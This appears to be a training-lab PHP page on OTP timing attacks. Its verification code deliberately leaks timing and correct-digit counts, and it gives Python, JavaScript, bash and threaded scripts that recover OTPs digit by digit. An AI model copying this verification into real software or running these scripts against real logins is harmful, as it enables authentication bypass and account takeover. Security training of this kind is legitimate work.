<?php
// Lab 3: OTP Timing Attack
// Vulnerability: OTP timing attack vulnerabilities

session_start();

$message = '';
$otp_sent = false;
$otp_verified = false;
$timing_info = '';

// Simulate OTP generation and verification
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'send_otp') {
        $phone = $_POST['phone'] ?? '';
        $email = $_POST['email'] ?? '';
        
        if (!empty($phone) || !empty($email)) {
            // Generate a simple 6-digit OTP
            $otp = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
            $_SESSION['otp'] = $otp;
            $_SESSION['otp_time'] = time();
            $_SESSION['phone'] = $phone;
            $_SESSION['email'] = $email;
            $otp_sent = true;
            $message = '<div class="alert alert-success">✅ OTP sent successfully! Check your phone/email.</div>';
        } else {
            $message = '<div class="alert alert-danger">❌ Please provide phone number or email.</div>';
        }
    } elseif ($action === 'verify_otp') {
        $entered_otp = $_POST['otp'] ?? '';
        $stored_otp = $_SESSION['otp'] ?? '';
        
        if (!empty($entered_otp) && !empty($stored_otp)) {
            // Check if OTP is expired (5 minutes)
            if (time() - $_SESSION['otp_time'] > 300) {
                $message = '<div class="alert alert-danger">❌ OTP has expired. Please request a new one.</div>';
            } else {
                // Simulate timing attack vulnerability
                $start_time = microtime(true);
                
                // Vulnerable OTP verification with timing differences
                $otp_array = str_split($stored_otp);
                $entered_array = str_split($entered_otp);
                
                $correct_chars = 0;
                for ($i = 0; $i < min(count($otp_array), count($entered_array)); $i++) {
                    if ($otp_array[$i] === $entered_array[$i]) {
                        $correct_chars++;
                        // Simulate processing time for correct character
                        usleep(1000); // 1ms delay for correct character
                    } else {
                        // Simulate processing time for incorrect character
                        usleep(500); // 0.5ms delay for incorrect character
                        break; // Stop on first incorrect character
                    }
                }
                
                $end_time = microtime(true);
                $response_time = ($end_time - $start_time) * 1000; // Convert to milliseconds
                
                $timing_info = "Response time: " . number_format($response_time, 2) . "ms, Correct characters: " . $correct_chars;
                
                if ($entered_otp === $stored_otp) {
                    $otp_verified = true;
                    $message = '<div class="alert alert-success">✅ OTP verified successfully! Access granted.</div>';
                } else {
                    $message = '<div class="alert alert-danger">❌ Invalid OTP. ' . $timing_info . '</div>';
                }
            }
        } else {
            $message = '<div class="alert alert-danger">❌ Please enter the OTP.</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 3: OTP Timing Attack - OTP Bypass Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .result-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .timing-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .otp-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .otp-code {
            font-family: 'Courier New', monospace;
            font-size: 2rem;
            font-weight: bold;
            color: var(--accent-green);
            text-align: center;
            letter-spacing: 0.5rem;
        }

        .timing-techniques {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .technique-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
        }

        .technique-title {
            color: var(--accent-green);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .technique-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .timing-chart {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .timing-bar {
            background: var(--accent-green);
            height: 20px;
            border-radius: 4px;
            margin: 0.5rem 0;
            transition: width 0.3s;
        }

        .timing-info {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-blue);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to OTP Bypass Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 3: OTP Timing Attack</h1>
            <p class="hero-subtitle">OTP timing attack vulnerabilities</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates OTP timing attack vulnerabilities where attackers can analyze response times to determine correct OTP characters, exploiting timing differences in character-by-character verification.</p>
            <p><strong>Objective:</strong> Understand how OTP timing attacks work and how to exploit them.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable OTP System
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>Two-Factor Authentication</h5>
                            <p>This system uses OTP for two-factor authentication. Try to exploit timing attacks:</p>
                            
                            <?php if (!$otp_sent): ?>
                            <form method="POST">
                                <input type="hidden" name="action" value="send_otp">
                                <div class="mb-3">
                                    <label for="phone" class="form-label">Phone Number</label>
                                    <input type="tel" class="form-control" id="phone" name="phone" placeholder="+1234567890">
                                </div>
                                <div class="mb-3">
                                    <label for="email" class="form-label">Email Address</label>
                                    <input type="email" class="form-control" id="email" name="email" placeholder="user@example.com">
                                </div>
                                <button type="submit" class="btn btn-primary">Send OTP</button>
                            </form>
                            <?php else: ?>
                            <form method="POST">
                                <input type="hidden" name="action" value="verify_otp">
                                <div class="mb-3">
                                    <label for="otp" class="form-label">Enter OTP</label>
                                    <input type="text" class="form-control" id="otp" name="otp" placeholder="123456" maxlength="6">
                                </div>
                                <button type="submit" class="btn btn-primary">Verify OTP</button>
                            </form>
                            <?php endif; ?>
                            
                            <?php echo $message; ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-clock me-2"></i>Timing Attack Tester
                    </div>
                    <div class="card-body">
                        <div class="timing-warning">
                            <h5>⚠️ Timing Attack Warning</h5>
                            <p>This lab demonstrates OTP timing attack vulnerabilities:</p>
                            <ul>
                                <li><code>Character-by-Character</code> - Sequential character verification</li>
                                <li><code>Timing Differences</code> - Different response times</li>
                                <li><code>No Constant Time</code> - Variable processing time</li>
                                <li><code>Early Exit</code> - Stop on first incorrect character</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Timing Attack Techniques</h5>
                            <p>These techniques can be used for timing attacks:</p>
                            <ul>
                                <li><code>Response Time Analysis</code> - Measure response times</li>
                                <li><code>Character Guessing</code> - Guess characters one by one</li>
                                <li><code>Statistical Analysis</code> - Analyze timing patterns</li>
                                <li><code>Automated Tools</code> - Use timing attack tools</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testTimingAttack()" class="btn btn-primary">Test Timing Attack</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($otp_sent && !$otp_verified): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>OTP Display (For Testing)
                    </div>
                    <div class="card-body">
                        <div class="otp-display">
                            <h5>Generated OTP (For Testing Only):</h5>
                            <div class="otp-code"><?php echo $_SESSION['otp'] ?? 'N/A'; ?></div>
                            <small class="text-muted">This OTP is displayed for testing purposes only. In real-world scenarios, this would be sent via SMS/email.</small>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <?php if ($timing_info): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Timing Information
                    </div>
                    <div class="card-body">
                        <div class="timing-info">
                            <h5>Response Timing Analysis:</h5>
                            <p><?php echo $timing_info; ?></p>
                            <small class="text-muted">Notice how response time varies based on the number of correct characters. This can be exploited to determine the correct OTP.</small>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Timing Attack Techniques
                    </div>
                    <div class="card-body">
                        <div class="timing-techniques">
                            <div class="technique-card">
                                <div class="technique-title">Response Time Analysis</div>
                                <div class="technique-demo">// Measure response times
const startTime = performance.now();
const response = await fetch('/verify_otp', {
    method: 'POST',
    body: JSON.stringify({otp: '123456'})
});
const endTime = performance.now();
const responseTime = endTime - startTime;</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Character Guessing</div>
                                <div class="technique-demo">// Guess characters one by one
for (let digit = 0; digit < 10; digit++) {
    const otp = digit + '00000';
    const time = await measureResponseTime(otp);
    // Longer time = more correct characters
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Statistical Analysis</div>
                                <div class="technique-demo">// Analyze timing patterns
const times = [];
for (let i = 0; i < 100; i++) {
    const time = await measureResponseTime(otp);
    times.push(time);
}
const avgTime = times.reduce((a, b) => a + b) / times.length;</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Automated Tools</div>
                                <div class="technique-demo">// Use tools like Burp Suite
// 1. Intercept OTP verification request
// 2. Use Intruder with timing analysis
// 3. Analyze response times
// 4. Determine correct characters</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Network Analysis</div>
                                <div class="technique-demo">// Use network analysis tools
// 1. Capture network traffic
// 2. Analyze response times
// 3. Look for timing patterns
// 4. Correlate with OTP attempts</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Machine Learning</div>
                                <div class="technique-demo">// Use ML for timing analysis
const features = [responseTime, correctChars];
const prediction = model.predict(features);
// Predict correct OTP based on timing</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> OTP Timing Attack</li>
                        <li><strong>Severity:</strong> Medium</li>
                        <li><strong>Method:</strong> Response time analysis</li>
                        <li><strong>Issue:</strong> Variable processing time</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Response Time Analysis:</strong> Measure response times</li>
                        <li><strong>Character Guessing:</strong> Guess characters one by one</li>
                        <li><strong>Statistical Analysis:</strong> Analyze timing patterns</li>
                        <li><strong>Automated Tools:</strong> Use timing attack tools</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>OTP Timing Attack Examples</h5>
            <p>Use these techniques to exploit OTP timing attack vulnerabilities:</p>
            
            <h6>1. Python Timing Attack Script:</h6>
            <div class="code-block">import requests
import time
import statistics

def measure_response_time(otp):
    start_time = time.time()
    response = requests.post('http://vulnerable-site.com/verify_otp', 
                           json={'otp': otp})
    end_time = time.time()
    return end_time - start_time

def timing_attack():
    correct_otp = ''
    
    for position in range(6):
        times = {}
        
        for digit in range(10):
            test_otp = correct_otp + str(digit) + '0' * (5 - position)
            
            # Measure multiple times for accuracy
            response_times = []
            for _ in range(10):
                response_times.append(measure_response_time(test_otp))
            
            times[digit] = statistics.mean(response_times)
        
        # Find digit with longest response time
        correct_digit = max(times, key=times.get)
        correct_otp += str(correct_digit)
        print(f"Position {position + 1}: {correct_digit} (avg time: {times[correct_digit]:.4f}s)")
    
    return correct_otp

print(timing_attack())</div>

            <h6>2. JavaScript Timing Attack:</h6>
            <div class="code-block">async function measureResponseTime(otp) {
    const startTime = performance.now();
    
    try {
        const response = await fetch('/verify_otp', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({otp: otp})
        });
        
        const endTime = performance.now();
        return endTime - startTime;
    } catch (error) {
        console.error('Error:', error);
        return 0;
    }
}

async function timingAttack() {
    let correctOTP = '';
    
    for (let position = 0; position < 6; position++) {
        const times = {};
        
        for (let digit = 0; digit < 10; digit++) {
            const testOTP = correctOTP + digit + '0'.repeat(5 - position);
            
            // Measure multiple times for accuracy
            const responseTimes = [];
            for (let i = 0; i < 10; i++) {
                const time = await measureResponseTime(testOTP);
                responseTimes.push(time);
            }
            
            times[digit] = responseTimes.reduce((a, b) => a + b) / responseTimes.length;
        }
        
        // Find digit with longest response time
        const correctDigit = Object.keys(times).reduce((a, b) => 
            times[a] > times[b] ? a : b
        );
        
        correctOTP += correctDigit;
        console.log(`Position ${position + 1}: ${correctDigit} (avg time: ${times[correctDigit].toFixed(4)}ms)`);
    }
    
    return correctOTP;
}

timingAttack().then(console.log);</div>

            <h6>3. cURL Timing Attack:</h6>
            <div class="code-block">#!/bin/bash

measure_time() {
    local otp=$1
    local start_time=$(date +%s.%N)
    
    curl -s -X POST http://vulnerable-site.com/verify_otp \
        -H "Content-Type: application/json" \
        -d "{\"otp\":\"$otp\"}" > /dev/null
    
    local end_time=$(date +%s.%N)
    echo "$end_time - $start_time" | bc
}

timing_attack() {
    local correct_otp=""
    
    for position in {0..5}; do
        local times=()
        
        for digit in {0..9}; do
            local test_otp="${correct_otp}${digit}$(printf '0%.0s' $(seq 1 $((5-position))))"
            
            # Measure multiple times
            local total_time=0
            for i in {1..10}; do
                total_time=$(echo "$total_time + $(measure_time $test_otp)" | bc)
            done
            
            local avg_time=$(echo "scale=4; $total_time / 10" | bc)
            times[$digit]=$avg_time
        done
        
        # Find digit with longest response time
        local max_time=0
        local correct_digit=0
        for digit in {0..9}; do
            if (( $(echo "${times[$digit]} > $max_time" | bc -l) )); then
                max_time=${times[$digit]}
                correct_digit=$digit
            fi
        done
        
        correct_otp="${correct_otp}${correct_digit}"
        echo "Position $((position+1)): $correct_digit (avg time: ${times[$correct_digit]}s)"
    done
    
    echo "Correct OTP: $correct_otp"
}

timing_attack</div>

            <h6>4. Burp Suite Timing Attack:</h6>
            <div class="code-block">// Burp Suite Intruder Configuration
// 1. Set up Intruder with OTP parameter
// 2. Use payload type: Numbers (000000-999999)
// 3. Enable "Response Times" in Intruder settings
// 4. Analyze response times to find patterns
// 5. Look for longer response times indicating correct characters

// Payload processing:
// - Use custom payload processor to generate OTPs
// - Measure response times for each attempt
// - Analyze timing patterns
// - Determine correct OTP based on timing</div>

            <h6>5. Statistical Analysis:</h6>
            <div class="code-block">import numpy as np
from scipy import stats

def analyze_timing_patterns(response_times, otps):
    # Calculate statistics
    mean_times = np.mean(response_times, axis=1)
    std_times = np.std(response_times, axis=1)
    
    # Find significant differences
    significant_digits = []
    for i in range(len(mean_times)):
        if mean_times[i] > np.mean(mean_times) + 2 * np.std(mean_times):
            significant_digits.append(i)
    
    return significant_digits

def advanced_timing_attack():
    response_times = []
    otps = []
    
    # Collect timing data
    for digit in range(10):
        times = []
        for _ in range(100):
            otp = str(digit) + '00000'
            time = measure_response_time(otp)
            times.append(time)
        response_times.append(times)
        otps.append(digit)
    
    # Analyze patterns
    significant_digits = analyze_timing_patterns(response_times, otps)
    return significant_digits</div>

            <h6>6. Machine Learning Approach:</h6>
            <div class="code-block">from sklearn.ensemble import RandomForestClassifier
import numpy as np

def train_timing_model(training_data):
    X = training_data['features']  # Response times, correct characters
    y = training_data['labels']    # Correct/incorrect OTP
    
    model = RandomForestClassifier(n_estimators=100)
    model.fit(X, y)
    return model

def predict_otp(model, response_times, correct_chars):
    features = np.array([[response_times, correct_chars]])
    prediction = model.predict(features)
    return prediction

def ml_timing_attack():
    # Train model on known data
    model = train_timing_model(training_data)
    
    # Use model to predict correct OTP
    correct_otp = ''
    for position in range(6):
        best_digit = 0
        best_score = 0
        
        for digit in range(10):
            test_otp = correct_otp + str(digit) + '0' * (5 - position)
            response_time = measure_response_time(test_otp)
            
            # Predict if this digit is correct
            score = model.predict_proba([[response_time, position + 1]])[0][1]
            
            if score > best_score:
                best_score = score
                best_digit = digit
        
        correct_otp += str(best_digit)
    
    return correct_otp</div>

            <h6>7. Network Analysis:</h6>
            <div class="code-block">// Use Wireshark or tcpdump to capture traffic
// 1. Start packet capture
// 2. Send OTP verification requests
// 3. Analyze response times in captured packets
// 4. Look for timing patterns
// 5. Correlate with OTP attempts

// Example tcpdump command:
// tcpdump -i any -w otp_timing.pcap host vulnerable-site.com

// Analyze with Python:
import pyshark

def analyze_packet_timing(pcap_file):
    cap = pyshark.FileCapture(pcap_file)
    response_times = []
    
    for packet in cap:
        if packet.http and packet.http.response_code == '200':
            response_times.append(float(packet.sniff_timestamp))
    
    return response_times</div>

            <h6>8. Advanced Timing Attack:</h6>
            <div class="code-block">import threading
import queue
import time

def parallel_timing_attack():
    results = queue.Queue()
    
    def test_digit(digit, position, correct_otp):
        test_otp = correct_otp + str(digit) + '0' * (5 - position)
        
        start_time = time.time()
        response = requests.post('http://vulnerable-site.com/verify_otp', 
                               json={'otp': test_otp})
        end_time = time.time()
        
        results.put((digit, end_time - start_time))
    
    correct_otp = ''
    
    for position in range(6):
        threads = []
        
        # Test all digits in parallel
        for digit in range(10):
            thread = threading.Thread(target=test_digit, 
                                    args=(digit, position, correct_otp))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Find digit with longest response time
        digit_times = []
        while not results.empty():
            digit_times.append(results.get())
        
        correct_digit = max(digit_times, key=lambda x: x[1])[0]
        correct_otp += str(correct_digit)
    
    return correct_otp</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Account takeover through timing analysis</li>
                <li>Financial fraud and payment manipulation</li>
                <li>Authentication bypass and privilege escalation</li>
                <li>Compliance violations and security breaches</li>
                <li>Cross-site attacks and data exfiltration</li>
                <li>Sophisticated account compromise</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement constant-time comparison</li>
                    <li>Use secure OTP verification algorithms</li>
                    <li>Implement proper rate limiting and throttling</li>
                    <li>Use secure OTP generation with sufficient entropy</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual authentication patterns</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use secure coding practices</li>
                    <li>Implement proper error handling</li>
                    <li>Educate users about OTP security</li>
                    <li>Use multi-factor authentication</li>
                    <li>Implement proper logging and monitoring</li>
                    <li>Use timing attack resistant algorithms</li>
                    <li>Implement proper input validation</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testTimingAttack() {
            alert('Timing Attack test initiated. Try the timing attack techniques above.');
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
